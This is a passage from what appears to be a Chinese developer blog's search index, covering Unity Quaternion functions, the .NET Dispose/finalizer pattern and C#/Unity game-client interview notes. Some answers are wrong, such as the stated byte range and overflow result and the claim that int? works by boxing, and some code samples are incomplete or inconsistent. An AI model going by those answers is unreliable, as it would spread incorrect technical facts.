分量，与this[]功能相同\n\n\nvoid SetFromToRotation(Vector3 fromDirection, Vector3 toDirection)\n设置成静态函数FromToRotation的结果\n\n\nvoid SetLookRotation(Vector3 view, Vector3 up &#x3D; Vector3.up)\n设置成静态函数LookRotation的结果\n\n\nvoid ToAngleAxis(out float angle, out Vector3 axis)\n设置成静态函数AngleAxis的结果\n\n\n说明：成员函数几个set方法多用于将当前四元数设置成目标四元数，目标四元数的构建方法与对应名称的静态函数相同。\n静态函数\n\n\n函数形式\n解释\n\n\n\nstatic float Angle(Quaternion a, Quaternion b)\n计算两个四元数前方矢量之间的夹角度数\n\n\nstatic Quaternion AngleAxis(float angle, Vector3 axis)\n构建一个四元数，它表示沿着一个轴旋转固定角度，即上述表示法③\n\n\nstatic float Dot(Quaternion a, Quaternion b)\n计算两个四元数之间的点积，返回一个标量，这个函数一般用不到，它的点积不代表什么具体的物理含义，具体定义方法见我的前述文章\n\n\nstatic Quaternion Euler(float x, float y, float z)\n构建一个四元数，它用欧拉旋转表示，即上述表示法①\n\n\nstatic Quaternion FromToRotation(Vector3 fromDirection, Vector3 toDirection)\n构建一个四元数，它表示从指向fromDirection方向到指向toDirection方向的相对旋转量，见上述表示法④\n\n\nstatic Quaternion Inverse(Quaternion rotation)\n构建一个四元数，它是指定的四元数的逆，也就是逆向旋转，比如原四元数表示相对+X轴旋转了90度，那么此函数结果就是相对+X轴旋转了-90度\n\n\nstatic Quaternion Lerp(Quaternion a, Quaternion b, float t)\n构建一个四元数，表示从四元数a到b的球面插值，所谓的插值也就是中间旋转量，从a作为起点，此时对应t为0，到b为终点，此时对应t为1。当t取0-1之间的小数时，就代表了中间的插值结果。这个方法与Slerp相同，计算速度快，但是精度低，如果相对旋转变化量很小，则效果不理想\n\n\nstatic Quaternion LerpUnclamped(Quaternion a, Quaternion b, float t)\n与Lerp相同，区别是，Lerp的t值会被钳制在[0,1]之间，而此方法则不会，t允许超出计算\n\n\nstatic Quaternion LookRotation(Vector3 forward, Vector3 upwards &#x3D; Vector3.up)\n构建一个四元数，使用前方上方矢量确定朝向，也就是上述表示法②\n\n\nstatic Quaternion RotateTowards(Quaternion from, Quaternion to, float maxDegreesDelta)\n构建一个四元数，表示从一个四元数from(的前方)向着另外一个四元数(的前方)旋转，但不能超出指定的角度，也就是如果两个前方矢量夹角超过指定角度，则旋转到达指定角度时就停止，若是夹角本身不足的话，则结果直接为目标四元数to，与上述表示法④的意思很接近\n\n\nstatic Quaternion Slerp(Quaternion a, Quaternion b, float t)\n球面插值，与Lerp功能相同，t值也被钳制，计算精度高，但是速度相对较慢\n\n\nstatic Quaternion SlerpUnclamped(Quaternion a, Quaternion b, float t)\n与Slerp功能相同，只是t值不被钳制，允许超出计算\n\n\nstatic Quaternion operator * (Quaternion lhs, Quaternion rhs)\n乘法运算符重载，当表示两个连续的旋转时，可以使用lhs * rhs的形式得出连续旋转的结果,lhs为左值，rhs为右值。注意左值是先进行的旋转，叠加右值旋转。用法示例:lhs &#x3D; lhs * rhs;\n\n\nstatic Vector3 operator *(Quaternion rotation, Vector3 point)\n乘法运算符重载，表示对一个矢量point施加旋转rotation，得出旋转后的结果矢量。用法示例:Vector3 result&#x3D;rotation * point\n\n\n验证前方上方矢量表示法为了验证前方上方矢量表示法的实际上方会重新计算，我设计了以下小实验。\n\n在场景中设置三个物体，它们的朝向是打乱的，从左到右分别对应1、2、3。可以使用以下代码将三个物体朝向调整为一致。\n//前方上方矢量界定法的实际上方会重新计算m_t1.transform.rotation = Quaternion.LookRotation(Vector3.forward, Vector3.up);m_t2.transform.rotation = Quaternion.LookRotation(Vector3.forward, new Vector3(0,0.5f,-0.5f));m_t3.transform.rotation = Quaternion.LookRotation(Vector3.forward, new Vector3(0,0.5f,0.5f));\n\n在start方法中执行上述代码后，如下：\n\n三个物体朝向是一致的，也就说明了上方矢量确实是进行了重新计算。\n总结几种表示方法下面使用代码总结几种表示法，对应同样的四元数，大致有四种表示方法。\n//旋转量的4种表示形式Quaternion q1=Quaternion.Euler(90, 0, 0);Quaternion q2 = Quaternion.LookRotation(Vector3.down ,Vector3.forward);Quaternion q3 = Quaternion.AngleAxis(90,Vector3.right);Quaternion q4 = Quaternion.FromToRotation(Vector3.up, Vector3.forward);showQ(&quot;q1&quot;,q1);showQ(&quot;q2&quot;,q2);showQ(&quot;q3&quot;,q3);showQ(&quot;q4&quot;,q4);\n\n它们的输出结果是：\n\n也就是说，这几种形式表示的四元数结果完全相同。\n将四元数旋转应用于子弹射击示例当枪管转动起来，子弹仍然沿着正确的朝向发射出去，可以使用很简单的几句话，修改之前的代码后如下：\nBullet_2 bullet = m_compPool.takeUnit&lt;Bullet_2&gt;();//发射时，将子弹的初始位置为枪口的当前位置bullet.m_transform.position = m_transform.position;//将子弹的初始化旋转设置为指向当前枪口前方bullet.m_transform.rotation = Quaternion.LookRotation(m_transform.forward);\n\n\n","categories":["dev"],"tags":["unity3d"]},{"title":"dotnet非托管资源的回收方法","url":"/2022/11/07/dev/language/csharp/dotnet%E9%9D%9E%E6%89%98%E7%AE%A1%E8%B5%84%E6%BA%90%E7%9A%84%E5%9B%9E%E6%94%B6%E6%96%B9%E6%B3%95/","content":"dotnet非托管资源的回收方法\n本文实例讲述了.net非托管资源的回收方法，分享给大家供大家参考。具体分析如下：\n释放未托管的资源有两种方法\n1、析构函数\n2、实现System.IDisposable接口\n一、析构函数构造函数可以指定必须在创建类的实例时进行的某些操作，在垃圾收集器删除对象时，也可以调用析构函数。析构函数初看起来似乎是放置释放未托管资源、执行一般清理操作的代码的最佳地方。但是，事情并不是如此简单。由于垃圾回收器的运行规则决定了，不能在析构函数中放置需要在某一时刻运行的代码，如果对象占用了宝贵而重要的资源，应尽可能快地释放这些资源，此时就不能等待垃圾收集器来释放了．实例\n复制代码代码如下:\nusing System;using System.Collections.Generic;using System.Linq;using System.Text;namespace MemRelease&#123;  class Program  &#123;    ~Program()    &#123;      // Orders.    &#125;    static void Main(string[] args)    &#123;    &#125;  &#125;&#125;\n\n\n在IL DASM中，你会发现并没有这个析构的方法。C#编译器在编译析构函数时，会隐式地把析构函数的代码编译为Finalize()方法的对应代码，确保执行父类的Finalize()方法 看下这段代码中对于析构函数的编译：\n复制代码代码如下:\n.method family hidebysig virtual instance void    Finalize() cil managed&#123; // Code size    14 (0xe) .maxstack 1 .try &#123;  IL_0000: nop  IL_0001: nop  IL_0002: leave.s  IL_000c &#125; // end .try finally &#123;  IL_0004: ldarg.0  IL_0005: call    instance void [mscorlib]System.Object::Finalize()  IL_000a: nop  IL_000b: endfinally &#125; // end handler IL_000c: nop IL_000d: ret&#125; // end of method Program::Finalize\n\n使用析构函数来释放资源有几个问题：\n1、与C++析构函数相比，C#析构函数的问题是他们的不确定性。在删除C++对象时，其析构函数会立即执行，但是由于垃圾收集器的工作方式，无法确定C#对象的析构函数何时执行。2、C#析构函数的执行会延迟对象最终从内存中删除的时间。有析构函数的对象需要2次处理才能删除：第一次调用析构函数时，没有删除对象，第二次调用才真正删除对象。\n二、IDisposable接口\nIDisposable接口定义了一个模式，为释放未托管的资源提供了确定的机制，并避免产生析构函数固有的与垃圾函数器相关的问题。IDisposable接口声明了一个方法Dispose()，它不带参数，返回void。\n1、MSDN建议按照下面的模式实现IDisposable接口\n复制代码代码如下:\npublic class Foo: IDisposable &#123;   public void Dispose()   &#123;    Dispose(true);    GC.SuppressFinalize(this);   &#125;   protected virtual void Dispose(bool disposing)   &#123;    if (!m_disposed)    &#123;      if (disposing)      &#123;        // Release managed resources      &#125;      // Release unmanaged resources      m_disposed = true;    &#125;   &#125;   ~Foo()   &#123;    Dispose(false);   &#125;   private bool m_disposed; &#125;\n\n\n\n在.NET的对象中实际上有两个用于释放资源的函数：Dispose和Finalize\n（1）、Finalize的目的是用于释放非托管的资源，而Dispose是用于释放所有资源，包括托管的和非托管的\n（2）、void Dispose(bool disposing)函数通过一个disposing参数来区别当前是否是被Dispose()调用如果是被Dispose()调用，那么需要同时释放托管和非托管的资源。如果是被~Foo()（也就是C#的Finalize()）调用了，那么只需要释放非托管的资源即可。\n（3)、Dispose()函数是被其它代码显式调用并要求释放资源的，而Finalize是被GC调用的在GC调用的时候Foo所引用的其它托管对象可能还不需要被销毁，并且即使要销毁，也会由GC来调用。因此在Finalize中只需要释放非托管资源即可。另外一方面，由于在Dispose()中已经释放了托管和非托管的资源，因此在对象被GC回收时再次调用Finalize是没有必要的，所以在Dispose()中调用GC.SuppressFinalize(this)避免重复调用Finalize。\n然而，即使重复调用Finalize和Dispose也是不存在问题的，因为有变量m_disposed的存在，资源只会被释放一次，多余的调用会被忽略过去。\nFinalize、Dispose保证了：\n(1)、 Finalize只释放非托管资源；(2)、 Dispose释放托管和非托管资源；(3)、 重复调用Finalize和Dispose是没有问题的；(4)、 Finalize和Dispose共享相同的资源释放策略，因此他们之间也是没有冲突的。\n2、IDisposable例子\n复制代码代码如下:\nnamespace 资源回收&#123;    class Program    &#123;        static void Main(string[] args)        &#123;            //使用using对实现IDisposable的类了进行资源管理/*拿到一个对象的时候，首先判断这个对象是否实现了IDisposable接口，如果实现了，最好就用using包裹住这个对象，保证这个对象用完之后被释放掉，否则很可能出现资源泄露的问题*/            using (Telphone t1 = new Telphone())            &#123;                t1.Open();                t1.Speak(&quot;hello&quot;);                t1.Bomb();                //t1.Dispose();//如果在这里调用了Dispose()方法释放资源，那么在执行t1.Open()方法就出错，电话线已经被剪断了，无法再打电话了                t1.Open();                t1.Speak(&quot;I am back!&quot;);            &#125;//代码执行到这里后，就会调用Dispose方法来进行资源回收            Console.ReadKey();        &#125;    &#125;    /// &lt;summary&gt;    /// Telphone类实现了IDisposable接口    /// &lt;/summary&gt;    class Telphone : IDisposable    &#123;        /// &lt;summary&gt;        /// 电话状态        /// &lt;/summary&gt;        private TelphoneState state;        /// &lt;summary&gt;        /// 打电话        /// &lt;/summary&gt;        public void Open()        &#123;            if (state == TelphoneState.Disposed)            &#123;                throw new Exception(&quot;电话线已经被剪断，无法打开！&quot;);            &#125;            state = TelphoneState.Open;            Console.WriteLine(&quot;拿起电话&quot;);        &#125;        /// &lt;summary&gt;        /// 说话        /// &lt;/summary&gt;        /// &lt;param name=&quot;s&quot;&gt;说话内容&lt;/param&gt;        public void Speak(string s)        &#123;            if (state != TelphoneState.Open)            &#123;                throw new Exception(&quot;没有连接&quot;);            &#125;            Console.WriteLine(s);        &#125;        /// &lt;summary&gt;        /// 挂掉电话        /// &lt;/summary&gt;        public void Bomb()        &#123;            state = TelphoneState.Close;            Console.WriteLine(&quot;挂掉电话&quot;);        &#125;        IDisposable 成员    &#125;    /// &lt;summary&gt;    /// 电话状态枚举    /// &lt;/summary&gt;    enum TelphoneState    &#123;        Open, Close, Disposed    &#125;&#125;\n\n\n\n程序运行结果如下图所示:三、析构函数和IDisposable混合调用的例子\n复制代码代码如下:\npublic class ResourceHolder : IDisposable&#123;   private bool isDispose ＝ false;   // 显示调用的Dispose方法　 public void Dispose()   &#123;      Dispose(true);     GC.SuppressFinalize(this);    &#125;    // 实际的清除方法　 protected virtual void Dispose(bool disposing)   &#123;      if (!isDisposed)      &#123;   　    if (disposing)　　     &#123;           // 这里执行清除托管对象的操作.         &#125;         // 这里执行清除非托管对象的操作      &#125;　    isDisposed=true;   &#125;   // 析构函数   ~ResourceHolder()   &#123;      Dispose (false);   &#125;&#125;\n\n希望本文所述对大家的asp.net程序设计有所帮助。 \n","categories":["language"],"tags":["csharp"]},{"title":"C# Questions","url":"/2022/11/07/dev/language/csharp/questions/","content":"面经：C#：Unity游戏开发客户端面经： https://blog.csdn.net/Sea3752/article/details/127354146?spm=1001.2014.3001.5501\n数据结构：Unity游戏开发客户端面经：https://blog.csdn.net/Sea3752/article/details/127520720?spm=1001.2014.3001.5501\nlua：Unity游戏开发客户端面经——lua（初级）_正在奋斗中的小志的博客-CSDN博客 \n算法：Unity游戏开发客户端面经——算法（初级）_正在奋斗中的小志的博客-CSDN博客_拉绳算法\n设计模式：Unity游戏开发客户端面经——设计模式（初级）_正在奋斗中的小志的博客-CSDN博客\nUnity：Unity游戏开发客户端面经——Unity（初级）_正在奋斗中的小志的博客-CSDN博客 \n性能优化：Unity游戏开发客户端面经——性能优化（初级）_正在奋斗中的小志的博客-CSDN博客\n热更新：Unity游戏开发客户端面经——热更新（初级）_正在奋斗中的小志的博客-CSDN博客\n网络 ：Unity游戏开发客户端面经——网络（初级）_正在奋斗中的小志的博客-CSDN博客\n数学：Unity游戏开发客户端面经——数学（初级）_正在奋斗中的小志的博客-CSDN博客\n操作系统：Unity游戏开发客户端面经——操作系统（初级）_正在奋斗中的小志的博客-CSDN博客ref ：https://blog.csdn.net/Sea3752/article/details/127718757\nUGUI优化1.UI动静分离动”指的是元素移动，或者放大&#x2F;缩小频率比较高的UI。“静”则是静止不动的UI，准确来说，是界面上不会移动、旋转、缩放、更换贴图和颜色的UI。UGUI系统是以Canvas为节点拆分动与静，把会动的UI元素放入专门为它们准备的合并用的画板上，再将静止不动的UI元素留在原来的画板上。这样一来，当会动的UI元素来回移动、旋转、缩放、改变贴图和颜色的时候，就不会再去重构那些静止部分的UI元素了。 动静分离后，CPU在重绘和合并时的消耗就大大降低了。\n2.拆分过重的UI有时一个Prefab里装着2～3个界面 ，它们在展示一个界面时隐藏了其他界面，这样的操作会导致一个UI里的东西过多，在实例化和初始化时，消耗的CPU也会很大，因此我们要想办法拆分这些过重的UI界面。所以我们需要把隐藏的UI拆分出来，使其成为独立运作的界面，只在需要展示时才调用实例化。\n\n打SpriteAtlas图集每个UI界面打一个私有的SpriteAtlas图集，多个UI公用的图片打一个公有的图集，这样可以合批处理，降低DrawCall，同时打ab包时不会产生资源冗余。\n\n4.遮罩尽量使用RectMask  由于底层实现的不同，使用Mask比RectMask产生的DrawCall多，所以建议尽量使用RectMask 作为遮罩。\n5.其它优化（1）不需要进行事件接受的组件，取消勾选Raycast Target。\n（2）不适用富文本的Text，取消勾选Rich Text。\n（3）尽量不用Best Fit。\nref：https://blog.csdn.net/m0_46712616/article/details/123001829\n面经：\nhttps://blog.csdn.net/sea3752/category_12057629.html\n网易雷火一面Unity回调方法执行顺序:Awake –&gt;OnEable–&gt; Start –&gt; FixedUpdate –&gt; Update –&gt; LateUpdate –&gt;OnGUI –&gt;Reset –&gt; OnDisable –&gt;OnDestroy\nref:https://blog.csdn.net/qq_38803654/article/details/115250287\nAnimator和Animation区别两者都是控制动画播放的\nAnimation控制一个动画播放的各类方法和数据（当然你可以通过修改目标动画进行动画切换）\nAnimator则可以实现控制多个动画的播放，切换，叠加等一级对骨骼动画控制等更复杂的效果，是一个动画状态机\n除却必要的动画文件，还会生成一个.controller结尾的文件，也因此占内存比Animation更大ref：https://blog.csdn.net/qq_39979037/article/details/91958858\n说说对象池unity各种回调方法特征\nC# GC什么是GCGC的全称是garbage collection，中文名称垃圾回收，是.net中对内存管理的一种功能。垃圾回收器跟踪并回收托管内存中分配的对象，定期执行垃圾回收以回收分配给没有有效引用的对象的内存。当使用可用内存不能满足内存请求时，GC会自动进行。\n在进行垃圾回收时，垃圾回收器回首先搜索内存中的托管对象，然后从托管代码中搜索被引用的对象并标记为有效，接着释放没有被标记为有效的对象并收回内存，最后整理内存将有效对象挪动到一起。这就是GC的四个步骤。\nGC的作用提高软件系统的内聚。降低编程复杂度，使程序员不必分散精力去处理析构。不妨碍设计师进行系统抽象。减少由于内存运用不当产生的Bug。成功的将内存管理工作从程序的编写时，脱离至运行时，使不可预估的管理漏洞变为可预估的。回收对象(什么是垃圾)上一篇文章有介绍.Net类型分为两大类，一个就是值类型，另一个就是引用类型。前者是分配在栈上，并不需要GC回收；后者是分配在堆上，因此它的内存释放和回收需要通过GC来完成。\n只要判定一个引用类型对象或者其包含的子对象没有任何引用是有效的，那么系统就认为它是垃圾。\n对象代龄CLR初始化后的第一批被创建的对象被列为0代对象。CLR会为0代对象设定一个容量限制，当创建的对象大小超过这个设定的容量上限时，GC就会开始工作，工作的范围是0代对象所处的内存区域，然后开始搜寻垃圾对象，并释放内存。当GC工作结束后，幸存的对象将被列为第1代对象而保留在第1代对象的区域内。此后新创建的对象将被列为新的一批0代对象，直到0代的内存区域再次被填满，然后会针对0代对象区域进行新一轮的垃圾收集，之后这些0代对象又会列为第1代对象，并入第1代区域内。第1代区域起初也会被设上一个容量限制值，等到第1代对象大小超过了这个限制之后，GC就会扩大战场，对第1代区域也做一次垃圾收集，之后，又一次幸存下来的对象将会提升一个代龄，成为第2代对象。\n回收方式Finalizer：\nFinalizer是对象被GC回收之前调用的终结器，初衷是在这里释放非托管资源，由于Finalize是由GC负责调用，所以可以说是一种自动的释放方式。但是这里面要注意两个问题：第一，由于无法确定GC何时会运作，因此可能很长的一段时间里对象的资源都没有得到释放，这对于一些关键资源而言是非常要命的。第二，由于负责调用Finalize的线程并不保证各个对象的Finalize的调用顺序，这可能会带来微妙的依赖性问题。如果你在对象a的Finalize中引用了对象b，而a和b两者都实现了Finalize，那么如果b的Finalize先被调用的话，随后在调用a的Finalize时就会出现问题，因为它引用了一个已经被释放的资源。因此，在Finalize方法中应该尽量避免引用其他实现了Finalize方法的对象。Dispose：C#提供using关键字支持Dispose Pattern进行资源释放。这样能通过确定的方式释放非托管资源，而且using结构提供了异常安全性。所以，一般建议采用Dispose Pattern，并在Finalizer中辅以检查，如果忘记显式Dispose对象则在Finalizer中释放资源。\nhttps://blog.csdn.net/weixin_42254223/article/details/108910619\n非托管资源回收: https://www.xp.cn/b.php/62852.htmlTcp和Udp特征以及区别操作系统原语 : https://blog.csdn.net/weixin_43896318/article/details/105418357进程通信方式补码求解子掩码计算死锁问题Lamada表达式委托和事件的区别\n闭包ref: https://blog.csdn.net/zhudaokuan/article/details/113032690\n排序树遍历https://blog.csdn.net/weixin_43915790/article/details/118163540\nB+树原理优点https://blog.csdn.net/summer_fish/article/details/109780915\n从1亿个玩家中找出战斗力排行第100的玩家前两天面试3面学长问我的这个问题（想说TEG的3个面试学长都是好和蔼，希望能完成最后一面，各方面原因造成我无比想去鹅场的心已经按捺不住了），这个问题还是建立最小堆比较好一些。\n    先拿10000个数建堆，然后一次添加剩余元素，如果大于堆顶的数（10000中最小的），将这个数替换堆顶，并调整结构使之仍然是一个最小堆，这样，遍历完后，堆中的10000个数就是所需的最大的10000个。建堆时间复杂度是O（mlogm），算法的时间复杂度为O（nmlogm）（n为10亿，m为10000）。\n\n这个算法还可以优化吗优化的方法：可以把所有10亿个数据分组存放，比如分别放在1000个文件中。这样处理就可以分别在每个文件的10^6个数据中找出最大的10000个数，合并到一起在再找出最终的结果。\nref：https://blog.csdn.net/Fly_as_tadpole/article/details/88378410\n二面如何处理抖动游戏同步如何保证准确性如何做断线重连说说你用过的网络同步框架你所知道的异步通信框架安卓图片压缩自动寻路算法如何处理寻路中的传送门有没有读过NGUI源码你认为NGUI该怎么做优化如何解决UI遮挡物体的问题有没有用过toluaXlua源码有没有看过Xlua底层如何实现热更新说一下c#的GC吧Delegate和Event的区别图形渲染管道Shader广告牌效果高斯模糊？边缘检测算法？光照模型？有没有了解过pbs光照？简单说下你写的opengl程序有没有看过开源引擎框架游戏引擎模型动画系统的实现\n三面(总裁面)知不知道mipmap知不知道怎么减少lua GC知不知道反射知不知道mono怎么优化知不知道四元数和欧拉角的区别知不知道怎么做内存优化知不知道什么是JPS算法知不知道JPS-BitPre知不知道怎么做视野裁剪知不知道怎么合包知不知道如何减少Drawcall项目用的TCP还是UDP是什么使得你们做出这个决策你们还做过那些重要决策，原因？会用SVN吗？除了这上面的你还有哪些技能？开源框架了解几个，简单介绍下CNN学过数据库吗Sql数据库用的什么算法有没有了解过红黑树红黑树怎么插入数据知不知道负载均衡和分布式会用Linux吗什么时候可以入职\n四面(HR)对我们雷火有了解吗玩过网易的哪些游戏你了解过雷火出品过哪些游戏吗有没有玩过逆水寒你是如何看待逆水寒和天刀这两款游戏如何看待版号问题大学做过哪些自己觉得很有意义的事接受加班吗等等等五面(交叉面，后来得知面我的是逆水寒那边的老大)Lua的GC了解过吗？c#的呢？为什么会有解释型语言？.net底层工作原理？了解过lua虚拟机吗？Lua虚拟机工作流程Lua中table的底层实现什么是GDB调试什么是chunkspyLua的闭包Lua底层模块加载原理Lua调试器如何工作Lua协程，对称和非对称协程C++智能指针有没有读过STL源码Vector的实现虚析构dynamic_cast和static_cast拥塞控制Upd如何实现可靠传输平面上三个点，任给一个点如何判断是否在三角形内还是三个点，任给一条线段判断线段是否和三角形相交垃圾邮件如何识别这个算法还能优化吗机器学习实现垃圾过滤从数据上出发有没有优化方案网络同步上你做过哪些探索还有什么想问的\nref：https://blog.csdn.net/qq_34204419/article/details/85148138\nCsharp1.C#中堆和栈的区别？栈：由编译器自动分配、释放。在函数体中定义的变量通常在栈上。 堆：一般由程序员分配释放。用 new、 malloc 等分配内存函数分配得到的就是在堆上。 存放在栈中时要管存储顺序，保持着先进后出的原则，他是一片连续的内存域，有系统自动分配和维护；堆：是无序的，他是一片不连续的内存域，有用户自己来控制和释放，如果用户自己不释放的话，当内存达到一定的特定值时，通过垃圾回收器(GC) 来回收。栈内存无需我们管理，也不受 GC 管理。当栈顶元素使用完毕，立马释放。而堆则需要 GC 清理。使用引用类型的时候，一般是对指针进行的操作而非引用类型对象本身。但是值类型则操作其本身2.C#中的委托是什么？事件是不是一种委托？委托的本质是一个类，委托是将一种方法作为参数代入到另一种方法。 事件是委托的实例，事件是一种 特殊的委托。 &#x2F;&#x2F; 比如： onclick 事件中的参数就是一种方法。3.C#静态构造函数特点是什么？最先被执行的构造函数，且在一个类里只允许有一个无参的静态构造函数执行顺序：静态变量 &gt; 静态构造函数 &gt; 实例变量 &gt; 实例构造函数4.CTS、CLS、CLR分别作何解释CTS ：通用语言系统。 CLS ：通用语言规范。 CLR ：公共语言运行库。CTS ： Common Type System 通用类型系统。 Int32 、 Int16 → int 、 String → string 、 Boolean → bool 。每种语言都定义了自己的类型， .NET 通过 CTS 提供了公共的类型，然后翻译生成对应的 .NET 类型。CLS ： Common Language Specification 通用语言规范。不同语言语法的不同。每种语言都有自己的语法，.NET 通过 CLS 提供了公共的语法，然后不同语言翻译生成对应的 .NET 语法。CLR ： Common Language Runtime 公共语言运行时，就是 GC 、 JIT 等这些。有不同的 CLR ，比如服务器CLR 、 Linux CLR （ Mono ）、 Silverlight CLR(CoreCLR) 。相当于一个发动机，负责执行 IL 。5.C#中什么是值类型与引用类型？值类型： struct 、 enum 、 int 、 float 、 char 、 bool 、 decimal引用类型： class 、 delegate 、 interface 、 array 、 object 、 string6.请详述在C#中类(class)与结构(struct)的异同？class 可以被实例化 , 属于引用类型 ,class 可以实现接口和单继承其他类 , 还可以作为基类型 , 是分配在内存的堆上的struct 属于值类型 , 不能作为基类型 , 但是可以实现接口 , 是分配在内存的栈上的 .7.new关键字的作用运算符：创建对象实例修饰符：在派生类定义一个重名的方法，隐藏掉基类方法约束：泛型约束定义，约束可使用的泛型类型8.int?和int有什么区别int ？为可空类型，默认值可以是 nullint 默认值是 0int? 是通过 int 装箱为引用类型实现9.C#中值传递与引用传递的区别是什么？值传递时，系统首先为被调用方法的形参分配内存空间，并将实参的值按位置一一对应地复制给形参，此后，被调用方法中形参值得任何改变都不会影响到相应的实参；引用传递时，系统不是将实参本身的值复制后传递给形参，而是将其引用值（即地址值）传递给形参，因此，形参所引用的该地址上的变量与传递的实参相同，方法体内相应形参值得任何改变都将影响到作为引用传递的实参。简而言之，按值传递不是值参数是值类型，而是指形参变量会复制实参变量，也就是会在栈上多创建一个相同的变量。而按引用传递则不会。可以通过 ref 和 out 来决定参数是否按照引用传递。10.C#中参数传递 ref 与 out 的区别？（ 1 ） ref 指定的参数在函数调用时必须先初始化，而 out 不用（ 2 ） out 指定的参数在进入函数时会清空自己，因此必须在函数内部进行初始化赋值操作，而 ref 不用总结： ref 可以把值传到方法里，也可以把值传到方法外； out 只可以把值传到方法外注意： string 作为特殊的引用类型，其操作是与值类型看齐的，若要将方法内对形参赋值后的结果传递出来，需要加上ref 或 out 关键字。11.C#中什么是装箱和拆箱？装箱：把值类型转换成引用类型拆箱：把引用类型转换成值类型装箱：对值类型在堆中分配一个对象实例，并将该值复制到新的对象中。（ 1 ）第一步：新分配托管堆内存 ( 大小为值类型实例大小加上一个方法表指针。（ 2 ）第二步：将值类型的实例字段拷贝到新分配的内存中。（ 3 ）第三步：返回托管堆中新分配对象的地址。这个地址就是一个指向对象的引用了。拆箱：检查对象实例，确保它是给定值类型的一个装箱值。将该值从实例复制到值类型变量中。在装箱时是不需要显式的类型转换的，不过拆箱需要显式的类型转换。int i&#x3D;0;System.Object obj&#x3D;i; &#x2F;&#x2F; 这个过程就是装箱！就是将 i 装箱！int j&#x3D;(int)obj;&#x2F;&#x2F; 这个过程 obj 拆箱！12.C#实现多态的过程中 overload 重载 与override 重写的区别？override 重写与 overload 重载的区别。重载是方法的名称相同。参数或参数类型不同，进行多次重载以适应不同的需要override 是进行基类中函数的重写。实现多态。重载：是方法的名称相同，参数或参数类型不同；重载是面向过程的概念。重写：是对基类中的虚方法进行重写。重写是面向对象的概念。 13.C# 中 static 关键字的作用？对类有意义的字段和方法使用 static 关键字修饰，称为静态成员，通过类名加访问操作符 “.” 进行访问 ; 对类的实例有意义的字段和方法不加 static 关键字，称为非静态成员或实例成员。注 : 静态字段在内存中只有一个拷贝，非静态字段则是在每个实例对象中拥有一个拷贝。而方法无论是否为静态，在内存中只会有一份拷贝，区别只是通过类名来访问还是通过实例名来访问。14.C# 成员变量和成员函数前加static的作用？它们被称为常成员变量和常成员函数，又称为类成员变量和类成员函数。分别用来反映类的状态。比如类成员变量可以用来统计类实例的数量，类成员函数负责这种统计的动作。不用 new15.C#中索引器的实现过程，是否只能根据数字进行索引，请描述一 下C# 通过提供索引器，可以象处理数组一样处理对象。特别是属性，每一个元素都以一个 get 或 set 方法暴露。索引器不单能索引数字（数组下标），还能索引一些 HASHMAP 的字符串，所以，通常来说， C# 中类的索引器通常只有一个，就是 THIS ，但也可以有无数个，只要你的参数列表不同就可以了索引器和返回值无关 , 索引器最大的好处是使代码看上去更自然，更符合实际的思考模式。微软官方一个示例：索引器允许类或结构的实例按照与数组相同的方式进行索引。 索引器类似于属性，不同之处在于它们的访问器采用参数。 在下面的示例中，定义了一个泛型类（ class SampleCollection ），并为其提供了简单的 get 和 set 访问器 方法（作为分配和检索值的方法）。 Program 类为存储字符串创建了此类的一个实例。16.C#中 abstract class和interface有什么区别?abstract class abstract 声明抽象类抽象方法，一个类中有抽象方法，那么这个类就是抽象类了。所谓的 抽象方法，就是不含主体（不提供实现方法），必须由继承者重写。因此，抽象类不可实例化，只能通 过继承被子类重写。interface 声明接口，只提供一些方法规约，在 C#8 之前的版本中不提供任何实现，在 C#9 版本也可以支 持接口的实现；不能用public 、 abstract 等修饰，无字段、常量，无构造函数两者区别：1.interface 中不能有字段，而 abstract class 可以有 ; 2.interface 中不能有 public 等修饰符，而 abstractclass 可以有。 3.interface 可以实现多继承 。17.C#中用sealed修饰的类有什么特点？密封，不能继承。18.字符串中string str&#x3D;null和string str&#x3D;””和string str&#x3D;string.Empty的区别string.Empty 相当于 “”,Empty 是一个静态只读的字段。 string str&#x3D;”” , 初始化对象，并分配一个空字符串 的内存空间 string str&#x3D;null, 初始化对象，不会分配内存空间19.byte b &#x3D; ‘a’; byte c &#x3D; 1; byte d &#x3D; ‘ab’; byte e &#x3D; ‘啊’; byte g &#x3D; 256; 这些变量有些错误是错在哪里?本题考查的是数据类型能承载数据的大小。1byte &#x3D;8bit ， 1 个汉字 &#x3D;2 个 byte ， 1 个英文 &#x3D;1 个 byte&#x3D;8bit所以 bc 是对的， deg 是错的。 ‘a’ 是 char 类型， a 错误java byte 取值范围是 -128127, 而 C# 里一个 byte 是 025520.string和StringBuilder的区别,两者性能的比较都是引用类型，分配再堆上 StringBuilder默认容量是 16 ，可以允许扩充它所封装的字符串中字符的数量 . 每个 StringBuffer 对象都有 一定的缓冲区容量，当字符串大小没有超过容量时，不会分配新的容量，当字符串大小超过容量时，会 自动增加容量。对于简单的字符串连接操作，在性能上 stringbuilder 不一定总是优于 strin 因为 stringbulider 对象的创建 也消耗大量的性能，在字符串连接比较少的情况下，过度滥用stringbuilder 会导致性能的浪费而非节约，只有大量无法预知次数的字符串操作才考虑stringbuilder 的使用。从最后分析可以看出如果是相对 较少的字符串拼接根本看不出太大差别。Stringbulider 的使用，最好制定合适的容量值，否则优于默认值容量不足而频繁的进行内存分21.什么是扩展方法？一句话解释，扩展方法使你能够向现有类型 “ 添加 ” 方法，无需修改类型条件：按扩展方法必须满足的条件， 1. 必须要静态类中的静态方法 2. 第一个参数的类型是要扩展的类型，并且需要添加this 关键字以标识其为扩展方法建议：通常，只在不得已的情况下才实现扩展方法，并谨慎的实现使用：不能通过类名调用，直接使用类型来调用\n\n特性是什么？如何使用？特性与属性是完全不相同的两个概念，只是在名称上比较相近。 Attribute 特性就是关联了一个目标对象的一段配置信息，本质上是一个类，其为目标元素提供关联附加信息，这段附加信息存储在dll 内的元数据，它本身没什么意义。运行期以反射的方式来获取附加信息23.什么叫应用程序域(AppDomain)一种边界，它由公共语言运行库围绕同一应用程序范围内创建的对象建立（即，从应用程序入口点开始，沿着对象激活的序列的任何位置）。应用程序域有助于将在一个应用程序中创建的对象与在其他应用程序中创建的对象隔离，以使运行时行 为可以预知。在一个单独的进程中可以存在多个应用程序域。应用程序域可以理解为一种轻量级进程。起到安全的作用。占用资源小。24.byte a &#x3D;255;a+&#x3D;5;a的值是多少？byte 的取值范围是 -2 的 8 次方至 2 的 8 次方 -1 ， -256 至 258 ， a+&#x3D;1 时， a 的值时 0 ， a+&#x3D;5 时， a 的值是 0 ，所 